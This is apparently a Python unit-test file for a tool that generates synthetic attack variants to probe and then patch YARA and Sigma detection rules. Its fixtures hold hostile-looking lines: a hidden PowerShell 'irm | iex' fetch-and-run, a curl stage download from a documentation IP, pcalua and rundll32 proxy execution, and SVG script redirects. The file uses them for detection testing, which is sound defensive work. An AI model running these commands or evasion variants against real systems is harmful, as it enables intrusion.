import unittest
from pathlib import Path

from tools.swarm.adapter import SwarmAdapter
from tools.swarm.autonomous import AutonomousOrchestrator
from tools.swarm.cable_writer import CableWriter
from tools.swarm.config import OperatorDirective, SafetyConstraints
from tools.swarm.craftsmen.process_craftsman import ProcessCraftsman
from tools.swarm.craftsmen.svg_craftsman import SvgCraftsman
from tools.swarm.critic import SwarmCritic
from tools.swarm.detectors import SigmaDetector, YaraDetector
from tools.swarm.models import BoundaryFinding, Variant
from tools.swarm.orchestrator import SwarmOrchestrator
from tools.swarm.prompt_engine import PromptEngine


class SwarmCriticTests(unittest.TestCase):
    """Verifies that the Critic enforces strict sandbox safety and syntax standards."""

    def setUp(self):
        self.critic = SwarmCritic()

    def test_critic_rejects_non_approved_domain(self):
        variant = Variant(
            id="test-1",
            target_type="yara",
            axis="syntax",
            mutation_name="bad_domain",
            description="Testing live domain rejection",
            payload='<svg xmlns="http://www.w3.org/2000/svg"><script>location.href="https://evil-live-site.com";</script></svg>',
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertFalse(verdict.passed)
        self.assertIn("Forbidden destination", verdict.reason)

    def test_critic_rejects_routable_ip(self):
        variant = Variant(
            id="test-2",
            target_type="sigma",
            axis="lolbin",
            mutation_name="bad_ip",
            description="Testing IP rejection",
            payload={
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Image": "C:\\Windows\\System32\\curl.exe",
                "CommandLine": "curl.exe http://198.51.100.25/stage.bin",
            },
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertFalse(verdict.passed)
        self.assertIn("Routable IPv4", verdict.reason)

    def test_critic_rejects_invalid_xml_syntax(self):
        variant = Variant(
            id="test-3",
            target_type="yara",
            axis="structural",
            mutation_name="malformed_xml",
            description="Testing broken XML tags",
            payload='<svg xmlns="http://www.w3.org/2000/svg"><script>unclosed tag',
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertFalse(verdict.passed)
        self.assertFalse(verdict.syntax_valid)

    def test_critic_approves_safe_reserved_domain(self):
        variant = Variant(
            id="test-4",
            target_type="yara",
            axis="structural",
            mutation_name="valid_svg",
            description="Testing safe approved domain",
            payload='<svg xmlns="http://www.w3.org/2000/svg"><script>location.href="https://safe-test.invalid/p";</script></svg>',
            cycle=1,
        )
        verdict = self.critic.evaluate(variant)
        self.assertTrue(verdict.passed, f"Safe variant rejected: {verdict.reason}")


class SwarmCraftsmanTests(unittest.TestCase):
    """Verifies that Craftsmen generate variants across requested cycles."""

    def test_svg_craftsman_generation(self):
        craftsman = SvgCraftsman()
        all_variants = []
        for cycle in (1, 2, 3):
            variants = craftsman.generate_variants(cycle=cycle)
            self.assertGreater(len(variants), 0, f"Cycle {cycle} produced 0 SVG variants")
            all_variants.extend(variants)
        self.assertGreaterEqual(len(all_variants), 8)

    def test_process_craftsman_generation(self):
        craftsman = ProcessCraftsman()
        all_variants = []
        for cycle in (1, 2, 3):
            variants = craftsman.generate_variants(cycle=cycle)
            self.assertGreater(len(variants), 0, f"Cycle {cycle} produced 0 process variants")
            all_variants.extend(variants)
        self.assertGreaterEqual(len(all_variants), 8)


class SwarmDetectorTests(unittest.TestCase):
    """Verifies local detector execution against synthetic variants."""

    def test_yara_detector_execution(self):
        detector = YaraDetector()
        variant = Variant(
            id="yara-test",
            target_type="yara",
            axis="structural",
            mutation_name="test_svg",
            description="test",
            payload=(
                '<svg xmlns="http://www.w3.org/2000/svg">\n'
                '  <script>window.location.href = "https://match.invalid";</script>\n'
                '</svg>'
            ),
            cycle=1,
        )
        result = detector.evaluate(variant)
        self.assertTrue(result.detected)

    def test_sigma_detector_execution(self):
        detector = SigmaDetector()
        variant = Variant(
            id="sigma-test",
            target_type="sigma",
            axis="syntax",
            mutation_name="test_proc",
            description="test",
            payload={
                "ParentImage": "C:\\Windows\\explorer.exe",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -w hidden -c \"irm https://test.invalid | iex\"",
            },
            cycle=1,
        )
        result = detector.evaluate(variant)
        self.assertTrue(result.detected)


class SwarmOrchestratorEndToEndTests(unittest.TestCase):
    """Verifies end-to-end multi-cycle closed-loop runs for both YARA and Sigma."""

    def test_yara_orchestrator_run(self):
        directive = OperatorDirective(
            target="yara",
            max_cycles=2,
            variants_per_cycle=4,
        )
        orchestrator = SwarmOrchestrator(directive)
        boundary_map, results = orchestrator.run()

        self.assertEqual(boundary_map.target_type, "yara")
        self.assertEqual(boundary_map.cycles_completed, 2)
        self.assertGreater(boundary_map.total_generated, 0)
        self.assertGreater(boundary_map.critic_approved, 0)
        self.assertGreater(len(results), 0)

    def test_sigma_orchestrator_run(self):
        directive = OperatorDirective(
            target="sigma",
            max_cycles=2,
            variants_per_cycle=4,
        )
        orchestrator = SwarmOrchestrator(directive)
        boundary_map, results = orchestrator.run()

        self.assertEqual(boundary_map.target_type, "sigma")
        self.assertEqual(boundary_map.cycles_completed, 2)
        self.assertGreater(boundary_map.total_generated, 0)
        self.assertGreater(boundary_map.critic_approved, 0)
        self.assertGreater(len(results), 0)



class PromptEngineTests(unittest.TestCase):
    """Verifies that PromptEngine translates natural language directives and generates valid variants."""

    def setUp(self):
        self.engine = PromptEngine()
        self.critic = SwarmCritic()

    def test_generate_from_custom_prompt_sigma(self):
        variant = self.engine.generate_from_prompt(
            "Simulate Explorer launching rundll32.exe url.dll,FileProtocolHandler",
            target_type="sigma",
        )
        self.assertEqual(variant.target_type, "sigma")
        self.assertEqual(variant.axis, "lolbin")
        self.assertIn("rundll32.exe", variant.payload["CommandLine"])
        verdict = self.critic.evaluate(variant)
        self.assertTrue(verdict.passed)

    def test_generate_from_custom_prompt_yara(self):
        variant = self.engine.generate_from_prompt(
            "Probe YARA scan window with 2048 bytes of comment padding and bracket property access",
            target_type="yara",
        )
        self.assertEqual(variant.target_type, "yara")
        self.assertIn("<!--", variant.payload)
        verdict = self.critic.evaluate(variant)
        self.assertTrue(verdict.passed)

    def test_generate_novel_hypotheses_are_valid(self):
        for target in ("sigma", "yara"):
            for idx in range(1, 5):
                prompt, variant = self.engine.generate_novel_hypothesis(target_type=target, index=idx)
                self.assertIsNotNone(prompt)
                verdict = self.critic.evaluate(variant)
                self.assertTrue(verdict.passed, f"Generated hypothesis rejected by critic: {verdict.reason}")


class AutonomousOrchestratorTests(unittest.TestCase):
    """Verifies continuous autonomous sparring loops and history persistence."""

    def test_autonomous_sparring_sigma(self):
        directive = OperatorDirective(
            target="sigma",
            max_cycles=1,
            variants_per_cycle=3,
        )
        auto_orch = AutonomousOrchestrator(directive)
        summary = auto_orch.run_autonomous(iterations=3)

        self.assertEqual(summary["iterations_run"], 3)
        self.assertGreaterEqual(summary["critic_approved"], 3)
        self.assertGreater(summary["detected_count"], 0)
        self.assertEqual(len(summary["history"]), 3)

    def test_autonomous_sparring_yara(self):
        directive = OperatorDirective(
            target="yara",
            max_cycles=1,
            variants_per_cycle=3,
        )
        auto_orch = AutonomousOrchestrator(directive)
        summary = auto_orch.run_autonomous(iterations=3)

        self.assertEqual(summary["iterations_run"], 3)
        self.assertGreaterEqual(summary["critic_approved"], 3)
        self.assertGreater(summary["detected_count"], 0)
        self.assertEqual(len(summary["history"]), 3)


class CableWriterTests(unittest.TestCase):
    """Verifies structured Threat Intelligence Cable authoring under ICD 203."""

    def test_next_cable_id_increments(self):
        writer = CableWriter()
        next_id = writer.get_next_cable_id()
        self.assertTrue(next_id.startswith("CABLE-2026-"))
        self.assertGreaterEqual(int(next_id.split("-")[-1]), 2)

    def test_format_and_write_cable(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdir:
            writer = CableWriter(cables_dir=Path(tmpdir))
            finding = BoundaryFinding(
                target_rule="proc_creation_win_explorer_clickfix_execution",
                target_type="sigma",
                cycle=1,
                variant_id="var-test",
                mutation_name="pcalua_proxy",
                axis="lolbin_proxy",
                detected=False,
                evasion_gap_found=True,
                root_cause="Explorer spawned pcalua.exe as an indirect execution proxy.",
                policy_recommendation="REC-SIGMA-006: Add pcalua.exe to monitored child images.",
            )
            variant = Variant(
                id="var-test",
                target_type="sigma",
                axis="lolbin_proxy",
                mutation_name="pcalua_proxy",
                description="Test directive",
                payload={"Image": "pcalua.exe", "CommandLine": "pcalua.exe -a powershell.exe -c irm"},
                cycle=1,
            )
            cable_path = writer.write_cable(
                finding=finding,
                variant=variant,
                patch_diff="+ selection_proxy_img:\n+   Image|endswith: ['\\pcalua.exe']",
                recommendation_id="REC-SIGMA-006",
                resilience_before=0.60,
                resilience_after=1.00,
            )
            self.assertTrue(cable_path.exists())
            content = cable_path.read_text(encoding="utf-8")
            self.assertIn("---", content)
            self.assertIn("cable_id:", content)
            self.assertIn("REC-SIGMA-006", content)
            self.assertIn("Diamond Model Analysis", content)
            self.assertIn("Epistemological Framework", content)
            self.assertIn("Observed Fact", content)
            self.assertIn("Analytical Judgment", content)

            # Check index file was updated
            index_path = Path(tmpdir) / "INDEX.md"
            self.assertTrue(index_path.exists())
            self.assertIn("pcalua_proxy", index_path.read_text(encoding="utf-8"))


class SwarmAdapterTests(unittest.TestCase):
    """Verifies Adapter agent self-healing patch synthesis and in-memory verification."""

    def test_heal_sigma_gap_candidate(self):
        adapter = SwarmAdapter()
        finding = BoundaryFinding(
            target_rule="proc_creation_win_explorer_clickfix_execution",
            target_type="sigma",
            cycle=1,
            variant_id="var-pcalua",
            mutation_name="pcalua_proxy",
            axis="lolbin_proxy",
            detected=False,
            evasion_gap_found=True,
            root_cause="Explorer spawned pcalua.exe to proxy execution.",
            policy_recommendation="REC-SIGMA-006: Add pcalua.exe to monitored child images.",
        )
        engine = PromptEngine()
        variant = engine.generate_from_prompt("Simulate Explorer launching pcalua.exe to proxy powershell download", target_type="sigma")
        rule_path = adapter.rules_dir / "sigma" / "proc_creation_win_explorer_clickfix_execution.yml"
        patched, rec_id, diff = adapter._synthesize_sigma_patch(rule_path, finding, variant)

        self.assertIsNotNone(patched)
        self.assertIn("selection_proxy_img", patched)
        self.assertIn("\\pcalua.exe", patched)
        self.assertEqual(rec_id, "REC-SIGMA-006")
        self.assertTrue(len(diff) > 0)

        # Verify candidate patch detects the variant
        is_verified = adapter._verify_patch(rule_path, patched, "sigma", variant)
        self.assertTrue(is_verified)

    def test_heal_yara_gap_candidate(self):
        adapter = SwarmAdapter()
        finding = BoundaryFinding(
            target_rule="Suspicious_Active_Content_SVG_Attachment",
            target_type="yara",
            cycle=1,
            variant_id="var-svg-meta",
            mutation_name="svg_foreignobject",
            axis="parser_differential",
            detected=False,
            evasion_gap_found=True,
            root_cause="SVG wraps HTML meta-refresh inside foreignObject.",
            policy_recommendation="REC-YARA-004: Add foreignObject and meta refresh to active content.",
        )
        engine = PromptEngine()
        variant = engine.generate_from_prompt("Test SVG foreignObject containing HTML meta-refresh redirect to external URL", target_type="yara")
        rule_path = adapter.rules_dir / "yara" / "suspicious_active_content_svg.yar"
        patched, rec_id, diff = adapter._synthesize_yara_patch(rule_path, finding, variant)

        self.assertIsNotNone(patched)
        self.assertIn("$foreign_meta_refresh", patched)
        self.assertEqual(rec_id, "REC-YARA-004")
        self.assertTrue(len(diff) > 0)

        # Verify candidate patch detects the variant
        is_verified = adapter._verify_patch(rule_path, patched, "yara", variant)
        self.assertTrue(is_verified)


if __name__ == "__main__":
    unittest.main()
